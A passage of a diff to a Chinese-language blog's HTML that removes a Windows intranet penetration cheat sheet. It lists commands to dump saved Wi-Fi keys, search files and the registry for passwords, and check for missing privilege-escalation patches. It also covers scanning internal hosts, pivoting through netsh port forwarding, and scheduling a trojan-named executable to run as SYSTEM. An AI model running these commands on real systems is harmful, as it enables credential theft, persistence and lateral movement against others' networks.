%PROCESSOR_ARCHITECTURE%         //查看系统是32还是64位  </span><br><span class="line">set                              //查看系统环境设置变量</span><br><span class="line">net start                     //查看当前运行的服务</span><br><span class="line">wmic service list brief              //查看进程服务</span><br><span class="line">wmic process list brief         //查看进程</span><br><span class="line">wmic startup list brief       //查看启动程序信息</span><br><span class="line">wmic product list brief            //查看安装程序和版本信息（漏洞利用线索）</span><br><span class="line">wmic startup list full         //识别开机启动的程序</span><br><span class="line">wmic process where(description=&quot;mysqld.exe&quot;) &gt;&gt; mysql.log  //获取软件安装路径</span><br><span class="line"></span><br><span class="line">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&apos;netsh wlan show profiles&apos;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</span><br><span class="line"> //一键获取wifi密码</span><br><span class="line"></span><br><span class="line"> if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell) </span><br><span class="line">//查看是否支持posershell</span><br><span class="line"></span><br><span class="line">qwinsta                       //查看登录情况</span><br><span class="line"></span><br><span class="line">schtasks.exe  /Create /RU &quot;SYSTEM&quot; /SC MINUTE /MO 45 /TN FIREWALL /TR &quot;c:/muma.ex    e&quot; /ED 2017/4/7  //添加计划任务</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set KB2829361=MS13-046&amp;set KB2830290=MS13-046&amp;set KB2667440=MS12-020&amp;set KB2667402=MS12-020&amp;set KB3124280=MS16-016&amp;set KB3077657=MS15-077&amp;set KB3045171=MS15-051&amp;set KB2592799=MS11-080&amp;set KB952004=MS09-012 PR&amp;set KB956572=MS09-012 巴西烤肉&amp;set KB970483=MS09-020 iis6&amp;set KB2124261=MS10-065 ii7&amp;set KB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280) do @type a.txt|@find /i &quot;%i&quot;||@echo %%i% Not Installed!)&amp;del /f /q /a a.txt</span><br><span class="line"> //windows未打补丁情况</span><br><span class="line"></span><br><span class="line"> REG query HKCU  /v &quot;pwd&quot; /s  //获取保存到注册表中的密码</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-内网网络结构"><a href="#0x03-内网网络结构" class="headerlink" title=" 0x03 内网网络结构"></a> 0x03 内网网络结构</h2> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> tracert IP    //路由跟踪</span><br><span class="line">route print    //打印路由表</span><br><span class="line">arp -a          //列出本网段内所有活跃的IP地址</span><br><span class="line">arp -s （ip + mac）//绑定mac与ip地址</span><br><span class="line">arp -d （ip + mac） //解绑mac与ip地址</span><br><span class="line">nbtscan -r 192.168.16.0/24      //通过小工具nbtscan扫描整个网络</span><br><span class="line">netsh firewall show config     //查看防火墙策略</span><br><span class="line">netsh firewall show state     //查看防火墙策略</span><br><span class="line">for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1 | find /i &quot;ttl&quot;   //批量扫描内网存活主机</span><br><span class="line"></span><br><span class="line">windows自带端口转发：</span><br><span class="line">netsh interface ipv6 install  //首先安装IPV6（xp、2003下IPV6必须安装，否则端口转发不可用！）</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=22 connectaddress=1.1.1.1 connectport=22  //将本机22到1.1.1.1的22</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=192.168.193.1 listenport=22 connectaddress=8.8.8.8 connectport=22</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=192.168.193.1 listenport=22 connectaddress=www.baidu.com connectport=22</span><br><span class="line">netsh interface portproxy show all // 查看转发配置</span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=22 //删除配置</span><br><span class="line">netsh firewall set portopening protocol=tcp port=22 name=Forward mode=enable scope=all profile=all  //添加防火墙规则，允许连接22：</span><br></pre></td></tr></table></figure>
-<p>0x04 敏感数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dir /b/s config.*              //查看所在目录所有config.为前缀的文件</span><br><span class="line">findstr /si password *.xml *.ini *.txt     //查看后缀名文件中含有password关键字的文件</span><br><span class="line">findstr /si login *.xml *.ini *.txt     //查看后缀名文件中含有login关键字的文件</span><br><span class="line">copy con 创建命令：</span><br><span class="line">copy con  ftp.bat     //创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功</span><br><span class="line">copy con  test.vbs    //创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x05-常用快捷命令"><a href="#0x05-常用快捷命令" class="headerlink" title="0x05 常用快捷命令"></a>0x05 常用快捷命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mspaint　　画图工具</span><br><span class="line">calc　　计算机</span><br><span class="line">notepad　　记事本</span><br><span class="line">taskmgr　　任务管理器</span><br><span class="line">osk　　打开屏幕键盘</span><br><span class="line">gpedit.msc　　组策略</span><br><span class="line">services.msc　　本地服务</span><br><span class="line">compmgmt.msc　　计算机管理</span><br><span class="line">devmgmt.msc　　设备管理器</span><br><span class="line">winver　　查看系统版本</span><br><span class="line">magnify　　放大镜实用程序</span><br><span class="line">eventvwr　　事件查看器</span><br><span class="line">Regedit　　打开注册表</span><br><span class="line">resmon　　资源监视器</span><br><span class="line">WMIC BIOS get releasedate　　查看电脑生产日期</span><br><span class="line">mstsc -f　　远程连接（可以全屏）</span><br></pre></td></tr></table></figure>
-<h2 id="0x06-其他"><a href="#0x06-其他" class="headerlink" title="0x06 其他"></a>0x06 其他</h2><p>其他更多命令和详细的用法说明，可以参考官方文档</p>
-<p><a href="https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf" target="_blank" rel="noopener">https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2538,7 +2673,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">66</span>
+                <span class="site-state-item-count">68</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
